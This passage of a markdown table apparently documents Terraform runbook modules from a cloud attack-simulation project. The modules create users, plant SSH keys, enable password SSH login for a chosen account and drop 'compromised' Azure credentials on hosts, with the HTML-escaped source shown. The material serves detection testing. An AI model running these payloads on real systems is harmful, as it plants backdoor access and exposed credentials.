| target-ssh-keys                                          | ./modules/runbook/deploy-ssh-keys                    | runbook_deploy_secret_ssh_private                | context.azure.runbook.ssh_keys                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_keys&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;ssh_authorized_keys_path&quot;: &quot;/home/sshuser/.ssh/authorized_keys&quot;,<br/>                    &quot;ssh_private_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key&quot;,<br/>                    &quot;ssh_public_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key.pub&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                    | <pre>&amp;#35; ssh key<br/>resource &quot;tls&amp;&amp;#35;95;private&amp;&amp;#35;95;key&quot; &quot;ssh&quot; &amp;&amp;#35;123;<br/>  algorithm = &quot;RSA&quot;<br/>  rsa&amp;&amp;#35;95;bits  = &quot;4096&quot;<br/>&amp;&amp;#35;125;<br/><br/>locals &amp;&amp;#35;123;<br/>    ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key = base64encode&amp;&amp;#35;40;tls&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;#46;ssh&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;pem&amp;&amp;#35;41;<br/>    ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key = base64encode&amp;&amp;#35;40;chomp&amp;&amp;#35;40;tls&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;#46;ssh&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;openssh&amp;&amp;#35;41;&amp;&amp;#35;41;<br/>    ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    public&amp;&amp;#35;95;key&amp;&amp;#35;95;user = split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;1&amp;&amp;#35;93; == &quot;root&quot; ? &quot;root&quot; : split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;2&amp;&amp;#35;93;<br/>    private&amp;&amp;#35;95;key&amp;&amp;#35;95;user = split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;1&amp;&amp;#35;93; == &quot;root&quot; ? &quot;root&quot; : split&amp;&amp;#35;40;&quot;/&quot;, local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;91;2&amp;&amp;#35;93;<br/><br/>    payload&amp;&amp;#35;95;public = &lt;&lt;&amp;#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>    log &quot;adding user: $&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password &quot;$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&quot; &amp;#124;&amp;#124; log &quot;$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; user already exists&quot;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;dirname&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>    chown &amp;#45;R $&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; $&amp;&amp;#35;123;dirname&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>    echo &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    echo &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt;&gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    sort $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125; &amp;#124; uniq &gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#46;uniq<br/>    mv $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#46;uniq $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chmod 600 $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chown &amp;#45;R $&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;public&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    log &quot;public key: $&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;public&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    log &quot;authorized key: $&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;authorized&amp;&amp;#35;95;keys&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;public&amp;&amp;#35;95;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload&amp;&amp;#35;95;public<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    payload&amp;&amp;#35;95;private = &lt;&lt;&amp;#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>    log &quot;adding user: $&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password &quot;$&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;&quot; &amp;#124;&amp;#124; log &quot;$&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; user already exists&quot;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;dirname&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>    echo &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chmod 600 $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    chown $&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;private&amp;&amp;#35;95;key&amp;&amp;#35;95;user&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    log &quot;private key: $&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;ssh&amp;&amp;#35;95;private&amp;&amp;#35;95;key&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;private&amp;&amp;#35;95;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload&amp;&amp;#35;95;private<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;public = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;public&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;private = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;95;private&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-ssh-user                                          | ./modules/runbook/deploy-ssh-user                    | runbook_deploy_ssh_user                          | context.azure.runbook.ssh_user                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_user&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;password&quot;: null,<br/>                    &quot;username&quot;: &quot;lou.caloozer&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                    | <pre>locals &amp;&amp;#35;123;<br/>    password = try&amp;&amp;#35;40;length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;password&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;,&quot;false&quot;&amp;&amp;#35;41; &amp;#33;= &quot;false&quot; ? var&amp;#46;inputs&amp;&amp;#35;91;&quot;password&quot;&amp;&amp;#35;93; :  random&amp;&amp;#35;95;password&amp;#46;password&amp;#46;result<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>    adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124;&amp;#124; log &quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; user already exists&quot;<br/>    log &quot;Setting passwd: $&amp;&amp;#35;123;local&amp;#46;password&amp;&amp;#35;125;&quot;<br/>    echo &#x27;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;password&amp;&amp;#35;125;&#x27; &amp;#124; chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd&amp;&amp;#35;95;config&amp;#46;d&quot;<br/>    cat &gt; /etc/ssh/sshd&amp;&amp;#35;95;config&amp;#46;d/common&amp;#45;user&amp;#45;passwd&amp;#45;auth&amp;#46;conf &lt;&lt;&amp;#45;EOF <br/>    &amp;#35; Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2&amp;#45;user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &#x27;We talked about this guys&amp;#46; No SSH for you&amp;#33;&#x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd&amp;&amp;#35;95;config&amp;#46;d/custom&amp;#45;user&amp;#45;passwd&amp;#45;auth&amp;#46;conf &lt;&lt;&amp;#45;EOF <br/>    Match User $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;username&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>        password = local&amp;#46;password<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;<br/><br/>resource &quot;random&amp;&amp;#35;95;password&quot; &quot;password&quot; &amp;&amp;#35;123;<br/>  length           = 16<br/>  special          = true<br/>  override&amp;&amp;#35;95;special = &quot;&amp;#33;&amp;#35;$%&amp;&amp;&amp;#35;42;&amp;&amp;#35;40;&amp;&amp;#35;41;&amp;#45;&amp;&amp;#35;95;=&amp;#43;&amp;&amp;#35;91;&amp;&amp;#35;93;&amp;&amp;#35;123;&amp;&amp;#35;125;&lt;&gt;:?&quot;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-azure-credentials                                 | ./modules/runbook/deploy-azure-credentials           | runbook_deploy_secret_azure_credentials          | context.azure.runbook.azure_credentials                           | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;azure_credentials&quot;: {<br/>                    &quot;compromised_keys_user&quot;: null,<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-credentials           | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;az&quot;<br/>    azure&amp;&amp;#35;95;creds = var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;credentials&quot;&amp;&amp;#35;93;&amp;&amp;#35;91;var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;keys&amp;&amp;#35;95;user&quot;&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;#46;rendered<br/>    &amp;#35; AZURE&amp;&amp;#35;95;CLIENT&amp;&amp;#35;95;ID: The Application &amp;&amp;#35;40;client&amp;&amp;#35;41; ID of the service principal&amp;#46;<br/>    &amp;#35; AZURE&amp;&amp;#35;95;CLIENT&amp;&amp;#35;95;SECRET: The client secret for the service principal&amp;#46;<br/>    &amp;#35; AZURE&amp;&amp;#35;95;TENANT&amp;&amp;#35;95;ID: The Tenant ID associated with your Azure subscription&amp;#46;<br/>    &amp;#35; AZURE&amp;&amp;#35;95;SUBSCRIPTION&amp;&amp;#35;95;ID: Your Azure Subscription ID&amp;#46;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Deploying azure credentials&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    mkdir &amp;#45;p ~/&amp;#46;azure<br/>    if &amp;&amp;#35;91;  &quot;$&amp;&amp;#35;123; local&amp;#46;azure&amp;&amp;#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &amp;&amp;#35;125;&quot; == &quot;true&quot; &amp;&amp;#35;93;; then<br/>      echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;azure&amp;&amp;#35;95;creds&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; ~/&amp;#46;azure/my&amp;#46;azureauth<br/>      export AZURE&amp;&amp;#35;95;AUTH&amp;&amp;#35;95;LOCATION=~/&amp;#46;azure/my&amp;#46;azureauth<br/>    fi<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found &amp;#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found &amp;#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         